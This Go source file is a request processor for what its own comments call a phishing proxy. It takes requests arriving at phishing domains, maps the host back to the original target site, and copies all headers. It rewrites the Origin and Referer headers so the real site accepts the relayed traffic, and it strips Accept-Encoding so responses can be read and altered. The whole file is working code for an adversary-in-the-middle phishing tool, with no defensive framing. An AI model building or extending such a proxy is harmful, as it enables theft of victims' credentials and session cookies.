package main

import (
	"io"
	"io/ioutil"
	"net/http"
	"net/url"

	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/fiber/v2/utils"
)

type RequestProcessor interface {
	Process(c *fiber.Ctx) *http.Request
}

func NewRequestProcessor(conv DomainConverter) RequestProcessor {
	return &requestProcessor{conv}
}

type requestProcessor struct {
	conv DomainConverter
}

// TODO patch query params (phishing URLs to original domains)
// TODO patch phishing URLs in body with original domains
func (p *requestProcessor) Process(c *fiber.Ctx) *http.Request {
	r := c.Request()
	c.Hostname()
	destURL := &url.URL{
		Scheme:   "https",
		Host:     p.conv.ToTarget(utils.UnsafeString(r.URI().Host())),
		Path:     utils.UnsafeString(r.URI().Path()),
		RawQuery: utils.UnsafeString(r.URI().QueryString()),
	}
	var body io.ReadCloser
	stream := c.Context().RequestBodyStream()
	if stream != nil {
		body = ioutil.NopCloser(stream)
	}
	req := &http.Request{
		Method: utils.UnsafeString(r.Header.Method()),
		Body:   body,
		URL:    destURL,
	}

	req.Header = make(http.Header)
	r.Header.VisitAll(func(k, v []byte) {
		sk := utils.UnsafeString(k)
		sv := utils.UnsafeString(v)
		req.Header.Add(sk, sv)
	})

	origin := req.Header["Origin"]
	if len(origin) > 0 {
		req.Header["Origin"] = []string{p.conv.ToTarget(origin[0])}
	}
	referer := req.Header["Referer"]
	if len(referer) > 0 {
		if targetURL := p.toTargetURL(referer[0]); targetURL != "" {
			req.Header["Referer"] = []string{targetURL}
		}
	}
	req.Header.Del("Accept-Encoding")
	return req
}

func (p *requestProcessor) toTargetURL(proxyURL string) string {
	u, err := url.Parse(proxyURL)
	if err != nil {
		return ""
	}
	if len(u.Host) > 0 {
		u.Host = p.conv.ToTarget(u.Host)
	}
	return u.String()
}
